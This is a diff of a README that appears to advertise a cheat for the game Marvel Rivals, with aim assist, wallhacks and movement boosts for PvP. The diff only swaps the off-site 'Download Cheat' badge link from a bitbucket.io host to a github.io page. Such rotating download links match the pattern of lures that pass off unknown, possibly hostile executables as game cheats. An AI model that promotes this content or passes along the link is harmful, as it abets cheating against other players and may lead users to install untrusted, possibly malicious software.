@@ -4,7 +4,7 @@
 
 If you're jumping into **Marvel Rivals**, you already know it's wild out there—fast team fights, high-powered abilities, and zero room for error. Want that **overpowered edge**? The **Marvel Rivals Cheat** is built to give you just that: **insane aim assist, wallhacks, movement boosts, and PvP domination** tools that let you **turn the tide of any battle** instantly. 🧠
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload1.bitbucket.io)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://Marvel-Rivals-Cheat-jo3.github.io/.github)
 ---
 
 ## 🎮 What Is Marvel Rivals?
